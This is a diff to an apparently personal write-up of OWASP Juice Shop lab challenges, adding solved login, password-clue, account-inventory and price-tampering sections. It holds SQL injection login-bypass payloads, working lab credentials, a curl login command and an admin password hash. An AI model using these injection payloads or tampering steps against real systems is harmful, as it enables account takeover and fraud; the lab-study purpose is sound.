@@ -31,6 +31,8 @@ Solved so far:
 | Outdated Allowlist | Unvalidated Redirects | Found stale crypto donation addresses in compiled frontend JavaScript and routed one through `/redirect?to=...`. |
 | Repetitive Registration | Improper Input Validation | Bypassed frontend validation and registered with an empty/different repeat-password value. |
 | Login MC SafeSearch | Sensitive Data Exposure | Used the OSINT password clue from MC SafeSearch's video. |
+| Login Jim | Injection | Used a targeted SQL injection against Jim's email in the login form. |
+| Login Amy | Sensitive Data Exposure | Used the password-haystack clue to derive Amy's padded original password. |
 
 ## Reconnaissance
 
@@ -119,6 +121,61 @@ This solved:
 ```text
 Login Admin
 Admin Section
+```
+
+## Targeted SQL Injection Logins
+
+For user-specific login challenges, a bare payload such as this is not enough:
+
+```text
+1=1--
+```
+
+It fails because it does not first break out of the SQL string. The payload needs an opening quote and a valid SQL expression/comment, or it needs to target the known email and comment out the password check.
+
+Jim's email:
+
+```text
+jim@juice-sh.op
+```
+
+Working Jim payload in the login form:
+
+```text
+Email: jim@juice-sh.op'--
+Password: anything
+```
+
+If the comment marker needs trailing whitespace:
+
+```text
+Email: jim@juice-sh.op'-- 
+Password: anything
+```
+
+Burp/API body:
+
+```json
+{
+  "email": "jim@juice-sh.op'--",
+  "password": "anything"
+}
+```
+
+Alternative targeted form:
+
+```json
+{
+  "email": "' OR email='jim@juice-sh.op'--",
+  "password": "anything"
+}
+```
+
+The same general pattern applies to Bender:
+
+```text
+Email: bender@juice-sh.op'--
+Password: anything
 ```
 
 ## Scoreboard Discovery
@@ -314,6 +371,30 @@ docker ps
 docker logs -f <container_id>
 docker exec -it <container_id> sh
 ```
+
+## Validated Login Inventory
+
+The administration user list uses green entries to indicate accounts that were successfully logged into during testing. The screenshot evidence showed these accounts as validated:
+
+```text
+admin@juice-sh.op
+jim@juice-sh.op
+bender@juice-sh.op
+bjoern.kimminich@gmail.com
+ciso@juice-sh.op
+support@juice-sh.op
+morty@juice-sh.op
+mc.safesearch@juice-sh.op
+J12934@juice-sh.op
+```
+
+The same screenshot showed this account still not validated:
+
+```text
+wurstbrot@juice-sh.op
+```
+
+This is useful tracking evidence for login/authentication challenge progress. It also helps separate confirmed account access from guessed usernames or payloads that have not worked yet.
 
 ## Feedback API Findings
 
@@ -605,6 +686,128 @@ Burp/API login body:
 
 Important detail: `N00dles` uses two zeroes and the password includes a space after `Mr.`.
 
+## Login Amy
+
+Amy's challenge looks like brute forcing, but the hint narrows the password enough that full brute force is not needed.
+
+Known email:
+
+```text
+amy@juice-sh.op
+```
+
+Challenge hint:
+
+```text
+This could take 93.83 billion trillion trillion centuries to brute force,
+but luckily she did not read the "One Important Final Note"
+```
+
+That points to password padding/haystacks. The example password pattern is:
+
+```text
+D0g.....................
+```
+
+Amy is the Futurama character Amy Wong, and her partner is Kif. The equivalent password is:
+
+```text
+K1f.....................
+```
+
+Working credentials:
+
+```text
+Email: amy@juice-sh.op
+Password: K1f.....................
+```
+
+Burp/API login body:
+
+```json
+{
+  "email": "amy@juice-sh.op",
+  "password": "K1f....................."
+}
+```
+
+Command-line test:
+
+```bash
+curl -s -X POST http://localhost:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  --data '{"email":"amy@juice-sh.op","password":"K1f....................."}'
+```
+
+Targeted mini wordlist used for reasoning:
+
+```text
+Kif.....................
+K1f.....................
+kif.....................
+k1f.....................
+```
+
+## Accounting Page and Price Tampering Attempt
+
+The accounting interface was reachable during testing and exposed order tracking plus editable product price and quantity fields.
+
+Observed route/functionality:
+
+```text
+Accounting
+Track Orders
+All Products
+Editable product price fields
+Editable product quantity fields
+```
+
+Products shown in the screenshot included:
+
+```text
+Apple Juice (1000ml)
+Apple Pomace
+Banana Juice (1000ml)
+Best Juice Shop Salesman Artwork
+Carrot Juice (1000ml)
+Eggfruit Juice (500ml)
+Fruit Press
+```
+
+Observed tampering attempt:
+
+```text
+All visible product prices were changed to 1.
+The quantity/amount field kept auto-refreshing.
+The related challenge was not completed from this attempt.
+```
+
+Example screenshot state:
+
+```text
+Apple Juice (1000ml): price 1, quantity 46
+Apple Pomace: price 1, quantity 63
+Banana Juice (1000ml): price 1, quantity 99
+Best Juice Shop Salesman Artwork: price 1, quantity 1
+Carrot Juice (1000ml): price 1, quantity 97
+Eggfruit Juice (500ml): price 1, quantity 38
+Fruit Press: price 1, quantity 65
+```
+
+Current assessment:
+
+```text
+This confirms weak authorization and/or business-logic exposure in the accounting UI, but the final objective was not completed because the amount/quantity values refreshed before the desired state could be persisted.
+```
+
+Follow-up:
+
+```text
+Capture the price/quantity update requests in Burp.
+Replay the update directly against the API instead of relying on the auto-refreshing UI.
+Check whether the objective expects price, quantity, order status, or a specific product field change.
+```
+
 ## Notifications and Mass Dispel
 
 Challenge-solved notifications are client-side UI elements that appear when a challenge transitions from unsolved to solved. Replaying the same API request in Burp does not reliably recreate a solved notification once the challenge is already marked solved.
@@ -780,6 +983,10 @@ Good next challenges to target:
 | EVID-016 | 2026-05-04 | Outdated Allowlist addresses | Frontend JS | `main.js` contained stale blockchain/dash/etherscan addresses |
 | EVID-017 | 2026-05-04 | Repetitive Registration bypass | Burp | Changed `passwordRepeat` to empty/different in registration request |
 | EVID-018 | 2026-05-04 | MC SafeSearch credentials | OSINT/Login | `mc.safesearch@juice-sh.op` / `Mr. N00dles` |
+| EVID-019 | 2026-05-04 | Jim targeted SQL injection | Login API/Burp | `jim@juice-sh.op'--` with any password |
+| EVID-020 | 2026-05-04 | Amy password-haystack clue | OSINT/Login | `amy@juice-sh.op` / `K1f.....................` |
+| EVID-021 | 2026-05-04 | Validated login inventory | Admin UI screenshot | Green user entries showed confirmed logins for admin, Jim, Bender, Bjoern, CISO, support, Morty, MC SafeSearch, and J12934 |
+| EVID-022 | 2026-05-04 | Accounting price tampering attempt | Accounting UI screenshot | Product prices changed to `1`, but quantity/amount refresh prevented completing the objective |
 
 ## Rough Notes
 
@@ -793,3 +1000,7 @@ Good next challenges to target:
 - Possible admin password hash to crack: `0192023a7bbd73250516f069df18b500`.
 - The NFT page accepted a derived Ethereum private key, not a MetaMask wallet connection.
 - Outdated crypto-address links must be visited through `/redirect?to=...`, not directly.
+- Bare `1=1--` is not a complete login SQLi payload unless the input first closes the quoted email string.
+- Amy's login is better solved from the password-padding clue than with broad brute force.
+- Green entries in the admin registered-users view are useful progress evidence for confirmed logins.
+- Accounting UI allowed product price edits to `1`, but the auto-refreshing quantity/amount fields mean this needs Burp/API replay for a reliable exploit path.
